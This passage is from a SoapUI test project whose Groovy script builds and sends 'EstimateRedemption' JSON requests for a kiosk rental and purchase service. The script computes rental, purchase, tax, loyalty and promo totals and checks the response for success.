if (purchaseformatIDList.size() != numAddPurchases.size())
{
    def difference = (purchaseformatIDList.size() - numAddPurchases.size())
     for (di = 0; di < difference; di++)
     {
         numAddPurchases.add('1') //if the size is different add the default to 1
     }
}
else
{
     //nothing to do, code looks good
}

//Prepare the final list
numAddRentalsList = numAddRentals.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
numAddPurchasesList = numAddPurchases.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
log.info ("numAddRentalsList: $numAddRentalsList; rentalformatIDList: $rentalformatIDList");
log.info ("numAddPurchasesList: $numAddPurchasesList; purchaseformatIDList: $purchaseformatIDList");
if ((rentalFormatIds == '0') || (rentalFormatIds == '') || (rentalFormatIds == 'null'))
{
	log.info ("No Rentals in the transaction");
	getDisctc.setPropertyValue('ExcludeRentalTitles', '0');
	getDisctc.setPropertyValue('ExcludePurchaseTitles', '0');
	testRunner.testCase.setPropertyValue('RentalCount', rentalCount.toString());
	testRunner.testCase.setPropertyValue("RentalTaxAmount", '0');
}
else
{
	//Will Run the GetDiscs TestCase; and categorize all the formats required for the transaction and save it at GetDisc testCase property level.
	for (r = 0; r < rentalformatIDList.size(); r++)
	{
	    curformatID = rentalformatIDList[r].toString().trim();
	    //log.info ("curformatID: $curformatID");
	    def getFormatName = sql.firstRow("select FormatName AS OID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.OID);     
	    getDisctc.setPropertyValue('FormatID', curformatID);
	    getDisctc.setPropertyValue('FormatName', FormatName);  
	    getDisctc.setPropertyValue('KioskID',KioskId);  
	    //Manually Hardcoded to some value so that SQL query doesnot fail in GetDiscs test Case.  
	    getDisctc.setPropertyValue('ExcludeRentalTitles', '0');    
	    getDisctc.setPropertyValue('ExcludePurchaseTitles', '0');  
	    
	    //Run the test case: GetRecoDiscs
	    def runGetDiscs = getDisctc.run( null, false );
	        
	    // show that it worked out ok
	    log.info("Status: $runGetDiscs.status, time taken for TestCase : [Get Discs] For $FormatName was: $runGetDiscs.timeTaken ms");
	        
	    // assert that it didn't fail
	    assert runGetDiscs.status != Status.FAILED : runGetDiscs.reason
	}
	//Will Grab one format a time to build the request.
	for (f = 0; f < rentalformatIDList.size(); f++)
	{
	    curformatID = rentalformatIDList[f].toString().trim();
	    def getFormatName = sql.firstRow("select FormatName, FormatTypeID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.FormatName);
	    def formatTypeID = (getFormatName.FormatTypeID.toString());
	    
	    //Get FormatTypeName from FormatIypeID
	    def excuteFormatType = sql.firstRow("Select FormatTypeName from FormatType Where FormatTypeID = $formatTypeID");
	    def formatTypeName = (excuteFormatType.FormatTypeName.toString());
	    def getBarcode = getDisctc.getPropertyValue("$FormatName-Barcodes");
	    def getTitleIDs = getDisctc.getPropertyValue("$FormatName-Titles");    
	    log.info ("getBarcode-$FormatName: $getBarcode");
	    getBarcodeList = getBarcode.split(",");
	    getTitleList = getTitleIDs.split(",");
	    numOfBarcodes = numAddRentalsList[f].toString().trim();
	    log.info ("numOfBarcodes: $numOfBarcodes; FormatName: $FormatName");	
	    //Create a payload for rental items; barcodes are grabed from the GetDiscs testcase property. 
	    for (b = 0; b < numOfBarcodes.toInteger(); b++)
	    {
	        curBarcodeID = getBarcodeList[b].toString().trim();
	        curTitleID = getTitleList[b].toString().trim();
	        
	        rentalPayload += "{"
	        rentalPayload += "\"ProductId\" : $curTitleID,"
	        //rentalPayload += "\"VendStatus\" : \"Vended\"," //To-DO
	        rentalPayload += "\"ProductFamily\" : \"$formatTypeName\","
	        rentalPayload += "\"ProductType\" : \"$FormatName\","
	        rentalPayload += "\"MultiDisc\" : false,"
	        rentalPayload += "\"Pricing\" : {"
	        if (curformatID == '1') //For DVD
	        {
			rentalPayload += "\"InitialNight\" : $dvdPrice,"
			rentalPayload += "\"ExtraNight\" : $dvdPrice,"
			rentalPayload += "\"NonReturn\" : $dvdNonreturnPrice,"
			//rentalPayload += "\"Purchase\" : $dvdNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $dvdPrice,"
			rentalPayload += "\"NonReturnDays\" : $dvdNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 1,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $dvdPrice,"
			rentalPayload += "\"DefaultExtraNight\" : $dvdPrice"
	           
		    //Calculate Rental Total
			rentalTotal += (dvdPrice.toBigDecimal());
			rentalDiscPrice.add(dvdPrice);
			rentalNonReturnPrice.add(dvdNonreturnPrice);
			rentalNonReturnDays.add(dvdNonReturnDays);
	        }
	        else if (curformatID == '2') //For Bluray
	        {
			rentalPayload += "\"InitialNight\" : $blurayPrice,"
			rentalPayload += "\"ExtraNight\" : $blurayPrice,"
			rentalPayload += "\"NonReturn\" : $blurayNonreturnPrice,"
			//rentalPayload += "\"Purchase\" : $dvdNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $blurayPrice,"
			rentalPayload += "\"NonReturnDays\" : $blurayNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 1,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $blurayPrice,"
			rentalPayload += "\"DefaultExtraNight\" : $blurayPrice"
			
			//Calculate Rental Total
			rentalTotal += (blurayPrice.toBigDecimal());
			rentalDiscPrice.add(blurayPrice);
			rentalNonReturnPrice.add(blurayNonreturnPrice); 
			rentalNonReturnDays.add(blurayNonReturnDays);
	        }
	        else //For Games
	        {
			rentalPayload += "\"InitialNight\" : $gamePrice,"
			rentalPayload += "\"ExtraNight\" : $gamePrice,"
			rentalPayload += "\"NonReturn\" : $gameNonreturnPrice,"
			//rentalPayload += "\"Purchase\" : $dvdNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $gamePrice,"
			rentalPayload += "\"NonReturnDays\" : $gameNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 1,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $gamePrice,"
			rentalPayload += "\"DefaultExtraNight\" : $gamePrice"
			
			//Calculate Rental Total
			rentalTotal += (gamePrice.toBigDecimal());
			rentalDiscPrice.add(gamePrice);
			rentalNonReturnPrice.add(gameNonreturnPrice);
			rentalNonReturnDays.add(gameNonReturnDays);
	        }
	        //rentalPayload += ",\"SourceType\" : 1"  --NEEDED ONLY FOR RECO (RESVAUTH AND MODRESVPICKUP
			rentalPayload += "}" 
			rentalPayload += "}" 
			 
			//Prepare it as List.
			rentalTitleIds.add(curTitleID);
			rentalBarcodes.add(curBarcodeID);
			rentalProductFamily.add(formatTypeName);
			rentalProductType.add(FormatName);
			rentalCount += 1;
			
			if (b+1 < numOfBarcodes.toInteger())
			{
			  rentalPayload += ","
			} 
		
	    }	    
	    if (f+1 < rentalformatIDList.size())
	    {
	        rentalPayload += ","
	    }  
	    //testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
	    getDisctc.setPropertyValue('ExcludeRentalTitles', rentalTitleIds.join(",").toString());
    	    testRunner.testCase.setPropertyValue('RentalTitleIds', rentalTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalBarcodes', rentalBarcodes.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalProductFamily', rentalProductFamily.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalProductType', rentalProductType.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalCount', rentalCount.toString());
	    testRunner.testCase.setPropertyValue('RentalDiscPrice', rentalDiscPrice.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalNonReturnPrice', rentalNonReturnPrice.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalNonReturnDays', rentalNonReturnDays.join(",").toString());	    
	}
//TO-DO
	//Have to build Loyalty and Promo payload here.
	//def loyaltyTitleList = Eval.me("[" + rentalTitleIds + "]") ;
	//def loyaltyTitlePrice = Eval.me("[" + rentalTitleIds + "]") ;
	log.info ("rentalTitleIds: $rentalTitleIds; rentalDiscPrice:$rentalDiscPrice");
testRunner.testCase.setPropertyValue("DiscountTitleIds",rentalTitleIds.join(",").toString())
testRunner.testCase.setPropertyValue("DiscountProductPrices",rentalDiscPrice.join(",").toString())




//Delete Above	
	if (loyaltyFlag == "")
	{
		testRunner.testCase.setPropertyValue("NonLoyaltyProductId",rentalTitleIds.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductPrice",rentalDiscPrice.join(",").toString());
		testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
	}
	else
	{
		loyaltyTitleList = rentalTitleIds.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
		loyaltyTitlePrice = rentalDiscPrice.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
		for (l = 0; l < numberOfLoyaltyFlags; l++)
		{
		    	def DiscountTitleIds = Eval.me("[" + context.expand( '${#TestCase#DiscountTitleIds}' ) + "]");
		    	def DiscountProductPrices = Eval.me("[" + context.expand( '${#TestCase#DiscountProductPrices}' ) + "]");
		    	curLoyaltyFlag = loyaltyFlagList[l].toString().trim();
			//curLoyaltyTitle = loyaltyTitleList[l].toString().trim();
			//curLoyaltyPrice = loyaltyTitlePrice[l].toString().trim();
			curLoyaltyTitle = DiscountTitleIds.take(1).toString().replace("[", "").replace("]", "");
			curLoyaltyPrice = DiscountProductPrices.take(1).toString().replace("[", "").replace("]", "");
		    	log.info ("curLoyaltyFlag:$curLoyaltyFlag; curLoyaltyTitle:$curLoyaltyTitle; curLoyaltyPrice:$curLoyaltyPrice");
		    	if (curLoyaltyFlag == '1')
		    	{
		    	testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","1");
		    	loyaltyPayload += "{"; 
			loyaltyPayload += "\"ProductId\": $curLoyaltyTitle,";
			loyaltyPayload += "\"DiscountType\": \"Loyalty\",";
			loyaltyPayload += "\"PromotionCode\": null,";
			//promoPayload += "\"PromotionIntentCode\": \"$ProductId\",";
			//promoPayload += "\"RedemptionPoints\": null,";
			loyaltyPayload += "\"Amount\": $curLoyaltyPrice";
			loyaltyPayload += "}"; 
			//Calculate Loyalty Total
			EstimatedLoyaltyAmount += (curLoyaltyPrice.toBigDecimal());
			loyaltyProductId.add(curLoyaltyTitle);
		    	loyaltyProductPrice.add(curLoyaltyPrice);
		    	
		    	}
		    	else if (curLoyaltyFlag == "0")
		    	{
		    		//testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
		    		nonLoyaltyProductId.add(curLoyaltyTitle);
		    		nonLoyaltyProductPrice.add(curLoyaltyPrice);
		    		log.info ("Flag is 0");
		    	}
		    	//remainingTitles = DiscountTitleIds.drop(1).toString().replace("[", "").replace("]", "");
		    	testRunner.testCase.setPropertyValue("DiscountTitleIds",DiscountTitleIds.drop(1).toString().replace("[", "").replace("]", ""))
		    	testRunner.testCase.setPropertyValue("DiscountProductPrices",DiscountProductPrices.drop(1).toString().replace("[", "").replace("]", ""))		    	
		    	if (l+1 < numberOfLoyaltyFlags)
		      {
		      		if (curLoyaltyFlag == '1')
		      		{
		      			loyaltyPayload += ","
		      		}
		      		else
		      		{
		      			//None as of Now
		      			
		      		}
		      		     	
		      }
		      log.info ("loyaltyPayload: $loyaltyPayload");
		} 
		testRunner.testCase.setPropertyValue("LoyaltyProductPrice",loyaltyProductPrice.join(",").toString());
		testRunner.testCase.setPropertyValue("LoyaltyProductId",loyaltyProductId.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductId",nonLoyaltyProductId.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductPrice",nonLoyaltyProductPrice.join(",").toString());
	}

	if ((PromoCode == "" || PromoCode == "null" || PromoCode == null))
	{
		testRunner.testCase.setPropertyValue("HasPromoDiscount","0");//NO Promo
	}
	else
	{
		testRunner.testCase.setPropertyValue("HasPromoDiscount","1");
		def getNonLoyaltyProductId = Eval.me("[" + context.expand( '${#TestCase#DiscountTitleIds}' ) + "]") ;
		def getNonLoyaltyProductPrice = Eval.me("[" + context.expand( '${#TestCase#DiscountProductPrices}' ) + "]") ;
		log.info ("getNonLoyaltyProductId:$getNonLoyaltyProductId; getNonLoyaltyProductPrice:$getNonLoyaltyProductPrice");

		promoCodeValue = Round16.format(discountvalue).toBigDecimal();
		
		
		def curTitleId = getNonLoyaltyProductId.take(1).toString().replace("[", "").replace("]", "");
		def curTitlePrice = getNonLoyaltyProductPrice.take(1).toString().replace("[", "").replace("]", "").toBigDecimal();
		
		promoPayload += "{";
		promoPayload += "\"ProductId\": $curTitleId,";
		promoPayload += "\"DiscountType\": \"PromotionCode\",";
		promoPayload += "\"PromotionCode\": \"$PromoCode\",";
		if (promoCodeValue > curTitlePrice)
		{
		promoPayload += "\"Amount\": $curTitlePrice";
		}
		else
		{
			promoPayload += "\"Amount\": $promoCodeValue";
		}
		promoPayload += "}";


		def remainingNonLoyaltyProductId = getNonLoyaltyProductId.drop(1).toString().replace("[", "").replace("]", "");
		def remainingNonLoyaltyProductPrice = getNonLoyaltyProductPrice.drop(1).toString().replace("[", "").replace("]", "");
		log.info ("remainingNonLoyaltyProductId:$remainingNonLoyaltyProductId; remainingNonLoyaltyProductPrice:$remainingNonLoyaltyProductPrice");
		testRunner.testCase.setPropertyValue("NonLoyaltyProductId",remainingNonLoyaltyProductId);
		testRunner.testCase.setPropertyValue("NonLoyaltyProductPrice",remainingNonLoyaltyProductPrice);		
	}
	log.info ("promoPayload:$promoPayload");
	
	//Rounding the rental Total
	rentalTotal = Round16.format(rentalTotal).toBigDecimal();
	SubTotal += rentalTotal;
	discountvalue = Round16.format(discountvalue).toBigDecimal();
	log.info ("Rentals Total: $rentalTotal; Promo Amount: $discountvalue");
	BigDecimal discountedSubTotal
	if (rentalTotal <= discountvalue)	{ discountedSubTotal = 0 }
	else { discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	
	// Rounding Discounted SubTotal 
	discountedSubTotal = Round16.format(discountedSubTotal).toBigDecimal();
	BigDecimal renttaxRate = ((context.expand( '${#TestCase#RentalTaxRate}').toBigDecimal()) / 100)
	BigDecimal rentalTaxAmt = (Round16.format(discountedSubTotal).toBigDecimal()) * ((renttaxRate).toBigDecimal());
	//rentalTaxAmt = Round16.format(rentalTaxAmt).toBigDecimal();
	rentalTaxAmt = Round2.format(rentalTaxAmt).toBigDecimal();
	DiscountedSubTotal += discountedSubTotal;
	BigDecimal grandTotal = discountedSubTotal + rentalTaxAmt;
	// trying to solve some rounding issues
	//grandTotal = Round16.format(grandTotal).toBigDecimal();
	grandTotal = Round2.format(grandTotal).toBigDecimal();
	log.info ("Rentals Discounted Total:$discountedSubTotal; Rentals Tax Amount:$rentalTaxAmt; Rentals Grand Total:$grandTotal");
	// add totals to the strings
	rentalPayload += "]," 
	rentalPayload += "\"Totals\" : { "
	rentalPayload += "\"TaxRate\" : " + context.expand( '${#TestCase#RentalTaxRate}') + ","
	rentalPayload += "\"Subtotal\" : $rentalTotal ,"
	rentalPayload += "\"DiscountedSubtotal\" : $discountedSubTotal,"
	rentalPayload += "\"TaxAmount\" : $rentalTaxAmt,"
	rentalPayload += "\"GrandTotal\" : $grandTotal} }";
	
	testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
	testRunner.testCase.setPropertyValue("RentalTaxAmount", rentalTaxAmt.toString());
	rentalTotal = grandTotal; //Defining it to calculate Total Amount
}

//Purchase payload
if ((purchaseFormatIds == '0') || (purchaseFormatIds == '') || (rentalFormatIds == 'null'))
{
	log.info ("No Purchases in the transaction");
	testRunner.testCase.setPropertyValue('PurchaseCount', purchaseCount.toString());
	testRunner.testCase.setPropertyValue("PurchaseTaxAmount", '0');
}
else
{
	for (r = 0; r < purchaseformatIDList.size(); r++)
	{
	    curPurchaseFormatID = purchaseformatIDList[r].toString().trim();
	    log.info ("PurchaseFormatID: $curPurchaseFormatID");
	    def getFormatName = sql.firstRow("select FormatName AS OID from Format where FormatID = $curPurchaseFormatID");
	    def purchaseFormatName = (getFormatName.OID);
	    getDisctc.setPropertyValue('FormatID', curPurchaseFormatID);
	    getDisctc.setPropertyValue('FormatName', purchaseFormatName);  
	    getDisctc.setPropertyValue('KioskID',KioskId);  	    
	    //Run the test case: GetRecoDiscs
	    def runGetDiscs = getDisctc.run( null, false );
	        
	    // show that it worked out ok
	    log.info("Status: $runGetDiscs.status, time taken for TestCase : [Get Discs] For $purchaseFormatName was: $runGetDiscs.timeTaken ms");
	        
	    // assert that it didn't fail
	    assert runGetDiscs.status != Status.FAILED : runGetDiscs.reason
	}
	for (f = 0; f < purchaseformatIDList.size(); f++)
	{
	    curformatID = purchaseformatIDList[f].toString().trim();
	    def getFormatName = sql.firstRow("select FormatName, FormatTypeID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.FormatName);
	    def formatTypeID = (getFormatName.FormatTypeID.toString());
	    
	    //Get FormatTypeName from FormatIypeID
	    def excuteFormatType = sql.firstRow("Select FormatTypeName from FormatType Where FormatTypeID = $formatTypeID");
	    def formatTypeName = (excuteFormatType.FormatTypeName.toString());
	    
	    def getBarcode = getDisctc.getPropertyValue("$FormatName-Barcodes");
	    def getTitleIDs = getDisctc.getPropertyValue("$FormatName-Titles");    
	    log.info ("getBarcode-$FormatName: $getBarcode");
	    getBarcodeList = getBarcode.split(",")
	    getTitleList = getTitleIDs.split(",")
	
	    numOfPurchaseBarcodes = numAddPurchasesList[f].toString().trim()
	    log.info ("numOfPurchaseBarcodes: $numOfPurchaseBarcodes; FormatName: $FormatName");
	
	    for (b = 0; b < numOfPurchaseBarcodes.toInteger(); b++)
	    {
		curBarcodeID = getBarcodeList[b].toString().trim();
		curTitleID = getTitleList[b].toString().trim();
		purchasePayload += "{"
		purchasePayload += "\"ProductId\" : $curTitleID,"
		//purchasePayload += "\"VendStatus\" : \"Vended\"," //TO-DO
		purchasePayload += "\"ProductFamily\" : \"$formatTypeName\","
		purchasePayload += "\"ProductType\" : \"$FormatName\","
		purchasePayload += "\"MultiDisc\" : false,"
		purchasePayload += "\"Pricing\" : {"
	        if (curformatID == '17') //DigitalCode Json
	        {
	            purchasePayload += "\"Purchase\" : $digitalCodePrice,"
	            purchasePayload += "\"Expiration\" : $digitalCodePrice,"
	            purchasePayload += "\"PriceSetId\" : 1,"
	            //Added a part of ProductPricing for BI; harcoded for the time being.
	            purchasePayload += "\"ProductPriceId\" : 1"
		  
	            //Calculate Rental Total
	            digitalTotal += (digitalCodePrice.toBigDecimal());
	            purchaseDiscPrice.add(digitalCodePrice);
	        }
	        else  //Regular Purchase of DVD, Bluray, or Game
	        {
	            purchasePayload += "\"Purchase\" : $purchasePrice,"
	            purchasePayload += "\"Expiration\" : $purchasePrice,"
	            purchasePayload += "\"PriceSetId\" : 1,"
	            //Added a part of ProductPricing for BI; harcoded for the time being.
	            purchasePayload += "\"ProductPriceId\" : 1"
	
	            //Calculate Rental Total
	            purchaseTotal += (purchasePrice.toBigDecimal());
	            purchaseDiscPrice.add(purchasePrice);
	            HasPhysicalPurchase = 'true';
	            testRunner.testCase.setPropertyValue("HasPhysicalPurchase",HasPhysicalPurchase);
	        }
	        
	        //purchasePayload += ",\"SourceType\" : 1" --NEEDED ONLY FOR RECO (RESVAUTH AND MODRESVPICKUP
		purchasePayload += "}"    
		purchasePayload += "}" 
		//Combine the list
		purchaseTitleIds.add(curTitleID);
		purchaseBarcodes.add(curBarcodeID);
		purchaseProductFamily.add(formatTypeName);
		purchaseProductType.add(FormatName);
	        //Count num of purchase.
	        purchaseCount += 1;
	        if (b+1 < numOfPurchaseBarcodes.toInteger())
	        {
	            purchasePayload += ","
	        } 
	    }
	    if (f+1 < purchaseformatIDList.size())
	    {
	        purchasePayload += ","
	    }
	    getDisctc.setPropertyValue('ExcludeRentalTitles', purchaseTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseTitleIds', purchaseTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseBarcodes', purchaseBarcodes.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseProductFamily', purchaseProductFamily.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseProductType', purchaseProductType.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseCount', purchaseCount.toString());
	    testRunner.testCase.setPropertyValue('PurchaseDiscPrice', purchaseDiscPrice.join(",").toString());
	}
	
	//Purchase Calculation	
	BigDecimal totalPurchaseTotal = (purchaseTotal.toBigDecimal() + digitalTotal.toBigDecimal())
	log.info ("totalPurchaseTotal: $totalPurchaseTotal");
	DiscountedSubTotal += totalPurchaseTotal;
	SubTotal += totalPurchaseTotal;
	def purchasetaxRate = context.expand( '${#TestCase#PurchaseTaxRate}');
	def digitalpurchasetaxRate = context.expand( '${#TestCase#DigitalPurchaseTaxRate}');
	if (digitalpurchasetaxRate == null || digitalpurchasetaxRate == "null" || digitalpurchasetaxRate == "") //If digitalpurchasetaxrate is null than use Purchase tax rate.
	{
		BigDecimal digitaltaxRate = ((purchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	else //if digitalpurchasetaxrate is not null than use that ever is provided.
	{
		BigDecimal digitaltaxRate = ((digitalpurchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	def totaldigitalpurchasetaxAmount = context.expand( '${#TestCase#digitalpurchaseTaxAmt}');
		
	BigDecimal purchaseTaxAmt = (Round16.format(purchaseTotal).toBigDecimal()) * ((purchasetaxRate).toBigDecimal()/100);
	purchaseTaxAmt = Round16.format(purchaseTaxAmt).toBigDecimal();
	
	log.info ("Digital Purchase Tax Amount: $totaldigitalpurchasetaxAmount; Purchase Tax Amount: $purchaseTaxAmt");
	def totalTaxAmount = (totaldigitalpurchasetaxAmount.toBigDecimal() + purchaseTaxAmt.toBigDecimal());
	BigDecimal purchaseGrandTotal = (totalPurchaseTotal + totalTaxAmount).toBigDecimal();
	log.info("Purchase Grand Total: $purchaseGrandTotal; Total Tax Amount: $totalTaxAmount");
	
	// add totals to the strings
	purchasePayload += "],"
	purchasePayload += "\"Totals\" : { ";
	if (HasPhysicalPurchase == 'true')
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#purchasetaxrate}') + ", ";
	}
	else
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#DigitalPurchaseTaxRate}') + ", ";
	}
	purchasePayload += "\"Subtotal\" : $totalPurchaseTotal,";
	purchasePayload += "\"DiscountedSubtotal\" : $totalPurchaseTotal,";
	//purchasePayload += "\"TaxAmount\" : \"" + totalTaxAmount + "\",";
	purchasePayload += "\"TaxAmount\" : $totalTaxAmount,";
	purchasePayload += "\"GrandTotal\" : $purchaseGrandTotal } }";
	
	testRunner.testCase.setPropertyValue("purchasePayload",purchasePayload);
	testRunner.testCase.setPropertyValue("PurchaseTaxAmount", totalTaxAmount.toString());
	purchaseTotal = purchaseGrandTotal;//Defining it to calculate Total Amount
}


TransactionTotal = (rentalTotal + purchaseTotal).setScale(2, BigDecimal.ROUND_HALF_UP);
//log.info ("TransactionTotal: $TransactionTotal");
testRunner.testCase.setPropertyValue("TransactionTotal",TransactionTotal.toString());
testRunner.testCase.setPropertyValue("DiscountedSubTotal",DiscountedSubTotal.toString());
testRunner.testCase.setPropertyValue("SubTotal",SubTotal.toString());

/*
//curLoyaltyFlag = loyaltyFlagList[f].toString().trim(); //NEW
loyaltyTitleList = rentalTitleIds.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
loyaltyTilePrice = rentalDiscPrice.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
//Will Run the GetDiscs TestCase; and categorize all the formats required for the transaction and save it at GetDisc testCase property level.
for (l = 0; l < loyaltyFlagList.size(); l++)
{
    	curLoyaltyFlag = loyaltyFlagList[l].toString().trim();
	curLoyaltyTitle = loyaltyTitleList[l].toString().trim();
	curLoyaltyPrice = loyaltyTilePrice[l].toString().trim();
    if (curLoyaltyFlag == '1')
    {
		loyaltyPayload += "{"; 
		loyaltyPayload += "\"ProductId\": $curLoyaltyTitle,";
		loyaltyPayload += "\"DiscountType\": \"Loyalty\",";
		loyaltyPayload += "\"PromotionCode\": null,";
		//promoPayload += "\"PromotionIntentCode\": \"$ProductId\",";
		//promoPayload += "\"RedemptionPoints\": null,";
		loyaltyPayload += "\"Amount\": $curLoyaltyPrice";
		loyaltyPayload += "}";
    } 
      if (l+1 < loyaltyFlagList.size())
      {
      		loyaltyPayload += ","     	
      }
}

def discountProductId = Eval.me("[" + context.expand( '${#TestCase#RentalTitleIds}' ) + "]").min();
promoPayload += "{"; 
promoPayload += "\"ProductId\": $discountProductId,";
promoPayload += "\"DiscountType\": \"PromotionCode\",";
promoPayload += "\"PromotionCode\": \"$PromoCode\",";
//promoPayload += "\"PromotionIntentCode\": \"$ProductId\",";
//promoPayload += "\"RedemptionPoints\": null,";
promoPayload += "\"Amount\": $discountvalue";
promoPayload += "}";


//Discount Tab:
if (PromoCode != "" || PromoCode != "null" || PromoCode != null)
{
	promoPayload += "\"ProductId\": $ProductId,";
	promoPayload += "\"DiscountType\": \"$PromotionCode\",";
	promoPayload += "\"PromotionCode\": \"$ProductId\",";
	promoPayload += "\"PromotionIntentCode\": \"$ProductId\",";
	promoPayload += "\"RedemptionPoints\": null,";
	promoPayload += "\"Amount\": $ProductId";
}
else
{
	promoPayload += "\"ProductId\": $ProductId,";
	promoPayload += "\"DiscountType\": \"Loyalty\",";
	promoPayload += "\"PromotionCode\": null,";
	promoPayload += "\"PromotionIntentCode\": null,";
	promoPayload += "\"RedemptionPoints\": $ProductId,";
	promoPayload += "\"Amount\": $ProductId";
}
*/

def HasLoyaltyDiscount = context.expand( '${#TestCase#HasLoyaltyDiscount}');
def HasPromoDiscount = context.expand( '${#TestCase#HasPromoDiscount}');
def discountPayload = "";

if (HasLoyaltyDiscount == '1' && HasPromoDiscount == '0')
{
	discountPayload = loyaltyPayload;
	log.info ("Has Loyalty");
}
else if (HasLoyaltyDiscount == '0' && HasPromoDiscount == '1')
{
	discountPayload = promoPayload;
	log.info ("has Promo Only");
}
else if (HasLoyaltyDiscount == '1' && HasPromoDiscount == '1')
{
	discountPayload = "$loyaltyPayload,$promoPayload";
	log.info ("has Loyalty and Promo");
}
else
{
	discountPayload = ""
	log.info ("No Promo and Loyalty");
}
log.info ("discountPayload:$discountPayload")
//Get Info needed 
def MessageId = UUID.randomUUID().toString();

def UseCredits = context.expand( '${#TestCase#UseCredits}');
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));

//Build EstimateRedemption Request
requestPayload += "{";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"KioskId\": $KioskId,";
requestPayload += "\"EngineVersion\": \"1.15.0.6\",";
requestPayload += "\"BundleVersion\": \"2.2.2.82\",";
requestPayload += "\"MessageType\": \"EstimateRedemption\",";
//requestPayload += "\"MessageType\": \"EstimateRedemption\",";
requestPayload += "\"CustomerProfileNumber\": \"$CustomerProfileNumber\",";
requestPayload += "\"ShoppingCart\": { ";
requestPayload += "\"Groups\": [  ";
if (rentalCount > 0 && purchaseCount == 0) {
	requestPayload += "$rentalPayload";
} else if (rentalCount == 0 && purchaseCount > 0) {
	requestPayload += "$purchasePayload";
} else if (rentalCount > 0 && purchaseCount > 0) {
	requestPayload += "$rentalPayload,$purchasePayload";
} else {
	log.info("No rental or purchase information generated!");
}
requestPayload += "],";
requestPayload += "\"Discounts\": [$discountPayload]";
requestPayload += "}} ";

// log to soapui log
log.info("EstimateRedemption Request: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result);
testRunner.testCase.setPropertyValue("ERMessageId",MessageId); ]]></script></con:config></con:testStep><con:testStep type="httprequest" name="EstimateRedemption (Request)" id="c11b1411-dfdc-4835-b678-bc8eca2e6e57"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" name="EstimateRedemption (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" id="b2fa5210-dde2-4787-8c9d-57bcd781cdfc" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" name="Check for Success and HasErrors" id="70bc7102-0d46-4704-81fc-09b7237cee25"><con:configuration><scriptText>
def response = URLDecoder.decode(messageExchange.getResponseContent())
log.info ("EstimateAccrualResponse: $response")
	assert response.contains("\"Success\":true,")
	assert response.contains("\"HasErrors\":false,")

